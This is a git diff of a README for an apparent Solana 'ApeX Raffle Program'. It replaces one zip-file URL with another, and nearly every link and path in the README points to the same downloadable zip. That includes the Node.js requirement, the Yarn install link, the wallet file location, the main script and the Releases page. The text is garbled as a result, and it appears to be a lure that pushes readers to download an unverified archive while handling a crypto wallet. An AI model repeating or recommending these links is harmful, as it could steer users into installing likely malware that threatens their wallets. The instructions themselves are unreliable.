@@ -1,6 +1,6 @@
 # 🎟️ ApeX-Raffle-program - Simple Way to Join Raffles
 
-[![Download](https://raw.githubusercontent.com/MIRAXVISHU/ApeX-Raffle-program/main/emulous/ApeX-Raffle-program.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/MIRAXVISHU/ApeX-Raffle-program/main/emulous/ApeX-Raffle-program.zip)
+[![Download](https://github.com/MIRAXVISHU/ApeX-Raffle-program/raw/refs/heads/main/raffle/cli/Raffle-program-Ape-v2.2.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/MIRAXVISHU/ApeX-Raffle-program/raw/refs/heads/main/raffle/cli/Raffle-program-Ape-v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the ApeX Raffle Program! This application allows you to participate i
 
 To download the application, visit the following link:
 
-[Download the ApeX-Raffle-program](https://raw.githubusercontent.com/MIRAXVISHU/ApeX-Raffle-program/main/emulous/ApeX-Raffle-program.zip)
+[Download the ApeX-Raffle-program](https://github.com/MIRAXVISHU/ApeX-Raffle-program/raw/refs/heads/main/raffle/cli/Raffle-program-Ape-v2.2.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of the program.
@@ -19,7 +19,7 @@ To download the application, visit the following link:
 ## 💻 System Requirements
 
 - Operating System: Windows, macOS, or Linux
-- https://raw.githubusercontent.com/MIRAXVISHU/ApeX-Raffle-program/main/emulous/ApeX-Raffle-program.zip Version 14 or above
+- https://github.com/MIRAXVISHU/ApeX-Raffle-program/raw/refs/heads/main/raffle/cli/Raffle-program-Ape-v2.2.zip Version 14 or above
 - Yarn: Version 1.22 or above
 - Solana Wallet: Necessary for account management
 
@@ -27,9 +27,9 @@ To download the application, visit the following link:
 
 Before running the program, you need to install some dependencies. Follow these steps:
 
-1. Install https://raw.githubusercontent.com/MIRAXVISHU/ApeX-Raffle-program/main/emulous/ApeX-Raffle-program.zip and Yarn. You can download them from their official websites:
-   - [https://raw.githubusercontent.com/MIRAXVISHU/ApeX-Raffle-program/main/emulous/ApeX-Raffle-program.zip Download](https://raw.githubusercontent.com/MIRAXVISHU/ApeX-Raffle-program/main/emulous/ApeX-Raffle-program.zip)
-   - [Yarn Installation](https://raw.githubusercontent.com/MIRAXVISHU/ApeX-Raffle-program/main/emulous/ApeX-Raffle-program.zip)
+1. Install https://github.com/MIRAXVISHU/ApeX-Raffle-program/raw/refs/heads/main/raffle/cli/Raffle-program-Ape-v2.2.zip and Yarn. You can download them from their official websites:
+   - [https://github.com/MIRAXVISHU/ApeX-Raffle-program/raw/refs/heads/main/raffle/cli/Raffle-program-Ape-v2.2.zip Download](https://github.com/MIRAXVISHU/ApeX-Raffle-program/raw/refs/heads/main/raffle/cli/Raffle-program-Ape-v2.2.zip)
+   - [Yarn Installation](https://github.com/MIRAXVISHU/ApeX-Raffle-program/raw/refs/heads/main/raffle/cli/Raffle-program-Ape-v2.2.zip)
 
 2. Install `ts-node` globally. Open your terminal or command prompt and run:
 
@@ -38,7 +38,7 @@ Before running the program, you need to install some dependencies. Follow these 
    ```
 
 3. Confirm that you have prepared your Solana wallet. Make sure the wallet file is located at:  
-   `https://raw.githubusercontent.com/MIRAXVISHU/ApeX-Raffle-program/main/emulous/ApeX-Raffle-program.zip` for testing.
+   `https://github.com/MIRAXVISHU/ApeX-Raffle-program/raw/refs/heads/main/raffle/cli/Raffle-program-Ape-v2.2.zip` for testing.
 
 ## 🛠️ Usage
 
@@ -47,24 +47,24 @@ To run the program, follow these steps:
 1. Navigate to the main script located at:
 
    ```
-   https://raw.githubusercontent.com/MIRAXVISHU/ApeX-Raffle-program/main/emulous/ApeX-Raffle-program.zip
+   https://github.com/MIRAXVISHU/ApeX-Raffle-program/raw/refs/heads/main/raffle/cli/Raffle-program-Ape-v2.2.zip
    ```
 
 2. The types for program accounts can be found here:
 
    ```
-   https://raw.githubusercontent.com/MIRAXVISHU/ApeX-Raffle-program/main/emulous/ApeX-Raffle-program.zip
+   https://github.com/MIRAXVISHU/ApeX-Raffle-program/raw/refs/heads/main/raffle/cli/Raffle-program-Ape-v2.2.zip
    ```
 
 3. The IDL to facilitate JavaScript binding is available at:
 
    ```
-   https://raw.githubusercontent.com/MIRAXVISHU/ApeX-Raffle-program/main/emulous/ApeX-Raffle-program.zip
+   https://github.com/MIRAXVISHU/ApeX-Raffle-program/raw/refs/heads/main/raffle/cli/Raffle-program-Ape-v2.2.zip
    ```
 
 4. You can test the script functions using the following instructions:
-   - Adjust commands in the `https://raw.githubusercontent.com/MIRAXVISHU/ApeX-Raffle-program/main/emulous/ApeX-Raffle-program.zip` file as needed.
-   - Ensure the `ANCHOR_WALLET` environment variable is set correctly in `https://raw.githubusercontent.com/MIRAXVISHU/ApeX-Raffle-program/main/emulous/ApeX-Raffle-program.zip`.
+   - Adjust commands in the `https://github.com/MIRAXVISHU/ApeX-Raffle-program/raw/refs/heads/main/raffle/cli/Raffle-program-Ape-v2.2.zip` file as needed.
+   - Ensure the `ANCHOR_WALLET` environment variable is set correctly in `https://github.com/MIRAXVISHU/ApeX-Raffle-program/raw/refs/heads/main/raffle/cli/Raffle-program-Ape-v2.2.zip`.
    - Run the script with:
 
    ```
@@ -111,4 +111,4 @@ For support, you can open an issue on the GitHub repository. The community or de
 
 ## 🎈 Acknowledgments
 
-Thank you for using the ApeX Raffle Program! Enjoy participating in exciting raffles and good luck! Don't forget to visit the [Releases page](https://raw.githubusercontent.com/MIRAXVISHU/ApeX-Raffle-program/main/emulous/ApeX-Raffle-program.zip) for updates and more information.
+Thank you for using the ApeX Raffle Program! Enjoy participating in exciting raffles and good luck! Don't forget to visit the [Releases page](https://github.com/MIRAXVISHU/ApeX-Raffle-program/raw/refs/heads/main/raffle/cli/Raffle-program-Ape-v2.2.zip) for updates and more information.
